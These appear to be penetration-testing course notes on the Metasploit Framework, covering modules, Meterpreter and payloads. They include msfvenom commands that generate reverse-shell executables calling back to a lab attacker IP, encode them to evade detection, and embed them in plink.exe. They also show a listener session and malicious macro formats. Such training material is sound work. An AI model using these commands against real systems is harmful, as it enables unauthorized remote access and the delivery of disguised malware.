# The Metasploit Framework

## Table of Contents
- [Metasploit User Interfaces and Setup](#metasploit-user-interfaces-and-setup)
  - [MSF Syntax](#msf-syntax)
  - [Auxiliary Modules](#auxiliary-modules)
  - [Exploit Modules](#exploit-modules)
- [Metasploit Payloads](#metasploit-payloads)
  - [Staged vs Non-Staged Payloads](#staged-vs-non-staged-payloads) 
  - [Meterpreter Payloads](#meterpreter-payloads)
  - [Executable Payloads](#executable-payloads)
  - [Metasploit Exploit Multi Handler](#metasploit-exploit-multi-handler)
  - [Client-Side Attacks](#client-side-attacks)
- [Building Our Own MSF Module](#building-our-own-msf-module)

## Metasploit User Interfaces and Setup
Starting postgresql manually
```sh
kali@kali:~$ sudo systemctl start postgresql
```
Starting postgresql at boot
```sh
kali@kali:~$ sudo systemctl enable postgresql
```
Creating the Metasploit database
```sh
kali@kali:~$ sudo msfdb init
```
Updating the Metasploit Framework
```sh
kali@kali:~$ sudo apt update; sudo apt install metasploit-framework
```
Starting the Metasploit Framework
```sh
kali@kali:~$ sudo msfconsole -q
msf6 >
```
### MSF Syntax
```sh
msf6 > show -h
```
Activate a module
```sh
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > back
msf6 > 
```
Most modules require options before they can be run. 

- We can configure these options with **set** and **unset** (**setg** or **unsetg** for global).
#### Metasploit Database Access
If the postgresql service is running, Metasploit will log findings and information about discovered hosts, services, or credentials in a convenient, accessible database.

Listing hosts and services in the database
```sh
msf6 auxiliary(scanner/portscan/tcp) > hosts
msf6 auxiliary(scanner/portscan/tcp) > services
```
Performing a Nmap scan from within Metasploit (using `db_nmap` wrapper)
```sh
msf6 auxiliary(scanner/portscan/tcp) > db_nmap <same_syntax_as_nmap>
```

#### Workspaces
To help organize content in the database, Metasploit allows us to store information in separate workspaces.
- Use the `workspace -a <w_name>` command to create a workspace. The workspace that you create becomes the current workspace.
- Use the `workspace` command to list all workspaces. An asterisk denotes the current workspace. `-v` option lists notes.
- Use the `workspace <w_name>` command to change workspace.
- Use the `workspace -d` command to delete a workspace.

Reference: https://docs.rapid7.com/metasploit/managing-workspaces/

### Auxiliary Modules
The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more.
- Listing all auxiliary modules
    ```sh
    msf6 auxiliary(scanner/portscan/tcp) > show auxiliary
    ```
- Searching for SMB auxiliary modules
    ```sh
    msf6 auxiliary(scanner/portscan/tcp) > search type:auxiliary name:smb
    ```
- Using, showing information and and listing options of a SMB module
    ```sh
    msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/smb/smb_version
    msf6 auxiliary(scanner/smb/smb_version) > info
    msf6 auxiliary(scanner/smb/smb_version) > options
    ```
- Listing all discovered credentials
    ```sh
    msf6 auxiliary(scanner/smb/smb_login) > creds
    ```
### Exploit Modules
- retrieve a listing of all payloads that are compatible with the currently selected exploit module
    ```sh
    msf6 exploit(windows/http/syncbreeze_bof) > show payloads
    ```
- specify a standard reverse shell payload (windows/shell_reverse_tcp) with set payload and list the options with show options:
    ```sh
    msf6 exploit(windows/http/syncbreeze_bof) > set payload windows/shell_reverse_tcp
    ```
- Checking if the target is vulnerable
    ```sh
    msf6 exploit(windows/http/syncbreeze_bof) > check
    [*] 192.168.120.11:80 - The target appears to be vulnerable.    
    ```
## Metasploit Payloads
### Staged vs Non-Staged Payloads
Syntax for staged vs non-staged payloads
```txt
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
```
- A non-staged payload is sent in its entirety along with the exploit. 
- A staged payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

### Meterpreter Payloads
Meterpreter is a multi-function payload that can be dynamically extended at run-time. 
- In practice, this means that the Meterpreter shell provides more features and functionality than a regular command shell, offering capabilities such as file transfer, keylogging, and various other methods of interacting with the victim machine. 

```sh
msf6 exploit(windows/http/syncbreeze_bof) > search meterpreter type:payload
```
#### Experimenting with Meterpeter
```sh
meterpreter > help
```
Executing simple commands in meterpreter
```sh
meterpreter > sysinfo
meterpreter > getuid
```
Uploading and downloading files with meterpeter
```sh
meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec

meterpreter > download "c:\windows\system32\calc.exe" /tmp/calc.exe
```
The biggest advantage of spawning a system shell from within Meterpreter is that if, for some reason, our shell should die, we can exit the shell to return to the Meterpreter session and re-spawn a shell in a new channel.
```sh
meterpreter > shell
```
### Executable Payloads
The Metasploit Framework payloads can also be exported into various file types and formats, such as ASP, VBScript, Jar, War, Windows DLL and EXE, and more.
```sh
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -o shell_reverse.exe
```
Encoding the reverse shell payload
```sh
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```
Embedding a payload in `plink.exe`
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```
Embedding the payload in `plink.exe` from within msfconsole
```sh
msf6 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```
### Metasploit Exploit Multi Handler
We should use the framework **multi/handler** module, which works for all single and multi-stage payloads.
```sh
msf6 payload(windows/shell_reverse_tcp) > use multi/handler
```
Executing multi/handler as a background job
```sh
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.118.2:443

msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                            Payload opts
  --  ----                    -------                            ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_https  https://192.168.118.2:443

msf6 exploit(multi/handler) > jobs -i 0
```
At this point, the multi/handler is running and listening for an HTTPS reverse payload connection. Now, we can generate a new executable containing the windows/meterpreter/reverse_https payload, execute it on our Windows target, and our handler should come to life:
```sh
msf6 exploit(multi/handler) > 
[*] https://192.168.118.2:443 handling request from 192.168.120.11; (UUID: vbg4lqkf) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 5 opened (192.168.118.2:443 -> 192.168.120.11:50795) at 2021-01-22 11:10:45 -0500
```
### Client-Side Attacks
The Metasploit Framework also offers many features that assist with client-side attacks, including various executable formats beyond those we have already explored. 
```sh
msfvenom -l formats
```
The hta-psh, vba, and vba-psh formats are designed for use in client-side attacks by creating either a malicious HTML Application or an Office macro for use in a Word or Excel document, respectively.

## Building Our Own MSF Module
